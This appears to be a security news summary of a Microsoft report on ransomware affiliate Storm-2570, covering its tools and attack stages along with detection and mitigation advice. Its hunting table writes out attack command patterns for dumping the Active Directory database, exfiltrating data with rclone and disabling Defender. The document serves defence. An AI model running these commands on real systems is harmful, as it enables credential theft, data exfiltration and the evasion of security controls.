# Microsoft Links Ransomware Affiliate Storm-2570 to Four Malware Families

**Severity:** high | **Category:** Threat Actor,Ransomware,Malware | **Updated:** 2026-09-25 | **Reading time:** 5 min

A Microsoft Threat Intelligence report details the activities of a single ransomware affiliate, Storm-2570, which has been observed deploying four different ransomware payloads: Qilin, DragonForce, Anubis, and BERT. The group maintains a consistent playbook of TTPs, including the use of RMM tools for C2, credential harvesting with Mimikatz, and data exfiltration with Rclone. This highlights the importance of tracking attacker behaviors over just the final malware payload for effective defense.

## Executive Summary
**[Microsoft](https://www.microsoft.com/security)** has identified and detailed the consistent operational playbook of a single ransomware affiliate, tracked as **Storm-2570**. This group is linked to attacks deploying at least four distinct ransomware families: **Qilin**, **DragonForce**, **Anubis**, and **BERT**. The research, published on September 24, 2026, underscores a critical defensive principle: tracking the consistent tactics, techniques, and procedures (TTPs) of the human operator provides more durable detection opportunities than focusing on the ever-changing final ransomware payload. Storm-2570's methodology involves abusing legitimate remote management tools, harvesting credentials, disabling security controls, and exfiltrating data before encryption, offering multiple chances for defenders to intervene.

---

## Threat Overview
**Storm-2570** is a prolific ransomware affiliate active since at least April 2025. By operating under multiple **[Ransomware-as-a-Service (RaaS)](https://en.wikipedia.org/wiki/Ransomware_as_a_service)** banners, the group complicates attribution and defense. However, Microsoft's analysis reveals a highly consistent set of post-compromise behaviors, creating a distinct fingerprint for the attacker.

The group has targeted a wide range of sectors, including healthcare, education, energy, and manufacturing, with victims located in the United States, Canada, the United Kingdom, Spain, the Netherlands, and Puerto Rico. While the initial access vector is not yet confirmed, their actions after gaining a foothold are well-documented and predictable.

## Technical Analysis
Storm-2570's attack lifecycle is characterized by the use of legitimate tools and common offensive security utilities, a 'living-off-the-land' approach mixed with custom tooling.

*   **Command and Control**: The affiliate heavily relies on remote management and monitoring (RMM) software for persistence and C2. Tools observed include `MeshAgent`, `Atera`, `NinjaRMM`, and `ScreenConnect`. They often rename the executables to masquerade as legitimate software ([`T1105 - Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/)).
*   **Credential Access**: Storm-2570 uses a variety of tools to harvest credentials, including **[Mimikatz](https://attack.mitre.org/software/S0002/)**, `LaZagne`, and `pypykatz`. Critically, they have been observed using the native Windows utility `ntdsutil` to create a copy of the Active Directory database (`ntds.dit`), which is then taken offline for credential extraction ([`T1003.003 - NTDS`](https://attack.mitre.org/techniques/T1003/003/)).
*   **Defense Evasion**: The group actively works to undermine security measures, including using commands to disable Microsoft Defender's real-time protection ([`T1562.001 - Disable or Modify Tools`](https://attack.mitre.org/techniques/T1562/001/)).
*   **Lateral Movement**: Tools like **[PsExec](https://attack.mitre.org/software/S0029)**, `Impacket`, and `NetExec` are used to move across the network to other systems.
*   **Exfiltration**: Before deploying ransomware, the group exfiltrates stolen data using tools like `s5cmd` and `Rclone` to upload archives to attacker-controlled cloud storage ([`T1567.002 - Exfiltration to Cloud Storage`](https://attack.mitre.org/techniques/T1567/002/)).
*   **Impact**: The final step is the deployment of one of the associated ransomware payloads, such as **Qilin**, to encrypt files across the network ([`T1486 - Data Encrypted for Impact`](https://attack.mitre.org/techniques/T1486/)).

## Impact Assessment
By targeting diverse and critical sectors, Storm-2570 poses a significant economic and operational threat. The consistent TTPs across different ransomware brands suggest a skilled and efficient operator capable of systematically compromising networks. The impact on a victim organization includes not only the cost of the ransom and recovery but also the damage from the public leak of sensitive data stolen during the exfiltration phase. The focus on healthcare and energy sectors is particularly concerning due to the potential for disruption of essential services.

## IOCs — Directly from Articles
No specific file hashes, IP addresses, or domains were mentioned in the source articles.

## Cyber Observables — Hunting Hints
Security teams should hunt for the following TTP-based observables:

| Type | Value | Description |
|---|---|---|
| `process_name` | `MeshAgent.exe`, `AteraAgent.exe`, `NinjaRMM.exe` | Presence of legitimate RMM tools in environments where they are not officially used. |
| `command_line_pattern` | `ntdsutil.exe "ac i ntds" "ifm" "create full C:\temp"` | Command to create an Install From Media (IFM) copy of the Active Directory database. |
| `command_line_pattern` | `rclone.exe copy /path/to/data remote:bucket` | Use of Rclone to exfiltrate data to cloud storage providers. |
| `command_line_pattern` | `Set-MpPreference -DisableRealtimeMonitoring $true` | PowerShell command used to disable Microsoft Defender. |
| `process_name` | `s5cmd.exe` | Presence and execution of the s5cmd tool, used for high-speed S3 data transfers. |

## Detection & Response
*   **Monitor RMM Tools**: Establish a baseline of approved remote administration tools. Alert on the installation or execution of any unauthorized RMM software. Use D3FEND's [`D3-EAL: Executable Allowlisting`](https://d3fend.mitre.org/technique/d3f:ExecutableAllowlisting) to prevent unapproved tools from running.
*   **Protect Active Directory**: Closely monitor for any use of `ntdsutil.exe`. Access to the `ntds.dit` file should be heavily restricted and logged. Alert on any process attempting to access or copy this file. [`D3-DAM: Domain Account Monitoring`](https://d3fend.mitre.org/technique/d3f:DomainAccountMonitoring) is a key defensive technique.
*   **Egress Traffic Filtering**: Monitor and filter outbound network traffic. The use of tools like `Rclone` and `s5cmd` creates distinctive traffic patterns to cloud storage providers that can be detected and blocked. [`D3-OTF: Outbound Traffic Filtering`](https://d3fend.mitre.org/technique/d3f:OutboundTrafficFiltering) can prevent data exfiltration.

## Mitigation
*   **Application Control**: Implement application control policies to restrict the execution of unauthorized software, including unapproved RMM tools and known credential dumping utilities.
*   **Harden Active Directory**: Secure privileged accounts, implement robust password policies, and restrict access to domain controllers. Follow best practices for securing AD against attacks like Kerberoasting and DCSync.
*   **Endpoint Protection**: Ensure endpoint security solutions are properly configured, tamper protection is enabled, and alerts for disabling security features are treated with high priority.
*   **Network Segmentation**: Segment the network to inhibit lateral movement, making it harder for an attacker to move from a compromised workstation to a critical server like a domain controller.

**Tags:** Storm-2570, ransomware affiliate, Qilin, DragonForce, TTPs, Microsoft, RMM, ntdsutil

## Sources
- [Beyond the ransomware: Tracking Storm-2570's consistent tradecraft across deployments](https://www.microsoft.com/en-us/security/blog/2026/09/24/beyond-ransomware-tracking-storm-2570-consistent-tradecraft-across-deployments/) — Microsoft Security (2026-09-24)
- [Microsoft Finds Ransomware Group Using Same Attack Blueprint Across Multiple Malware Families](https://cybersecuritynews.com/microsoft-finds-ransomware-group/) — Cyber Security News (2026-09-25)
- [Storm-2570 Uses Four Ransomware Brands—and the Same Access Tools](https://blog.gridinsoft.com/storm-2570-ransomware-remote-access/) — Gridinsoft (2026-09-24)
- [Storm-2570 Ransomware Blueprint Exposed](https://cypro.co.uk/insights/cyber-bulletins/storm-2570-ransomware-blueprint-exposed/) — Cypro (2026-09-25)

---
Source: https://cyber.netsecops.io/articles/microsoft-details-ransomware-affiliate-storm-2570-consistent-ttps/
